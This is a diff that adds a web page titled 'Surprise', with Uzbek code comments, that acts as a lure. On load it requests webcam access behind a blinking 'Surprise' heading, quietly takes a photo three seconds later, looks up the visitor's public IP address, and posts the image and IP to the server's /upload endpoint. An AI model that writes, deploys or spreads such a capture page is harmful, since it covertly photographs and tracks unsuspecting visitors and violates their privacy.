@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+        h1 {
+            font-size: 5em;
+            color: white;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        #message {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Surprise</h1>
+    <div id="message">Kamera ruxsatini so‘rayapti...</div>
+    <script>
+        // IP manzilni olish uchun tashqi API'dan foydalanamiz
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('IP manzilni olishda muammo yuz berdi');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IP manzilni olishda xato:', error);
+                return 'IP manzilni olish mumkin emas';
+            }
+        }
+
+        // Kamera ruxsatini olish va avtomatik rasm olish
+        async function capturePhoto() {
+            const message = document.getElementById('message');
+            message.style.display = 'block';  // Xabarni ko‘rsatish
+
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                // Kamera ruxsatini olish
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+
+                // Canvas o'lchamlarini video o'lchamlariga moslashtirish
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    setTimeout(async () => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/png');
+                        const ip = await getIP();
+
+                        // Rasm va IP manzilni serverga yuborish
+                        fetch('/upload', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: dataURL, ip: ip }),
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        }).then(response => response.json())
+                          .then(data => console.log('Success:', data))
+                          .catch(error => console.error('Error:', error));
+                        
+                        // Kamera oqimini to'xtatish
+                        stream.getTracks().forEach(track => track.stop());
+                        message.style.display = 'none';  // Xabarni yashirish
+                    }, 3000);  // 3 soniya keyin rasm olish
+                };
+
+            } catch (error) {
+                console.error('Kamera ruxsatini olishda xato:', error);
+                message.textContent = 'Kamera ruxsatini olishda xato yuz berdi.';
+                message.style.display = 'block';  // Xabarni ko‘rsatish
+            }
+        }
+
+        // Sahifa yuklanganda avtomatik rasm olishni boshlash
+        window.onload = () => {
+            capturePhoto();
+        };
+    </script>
+</body>
+</html>
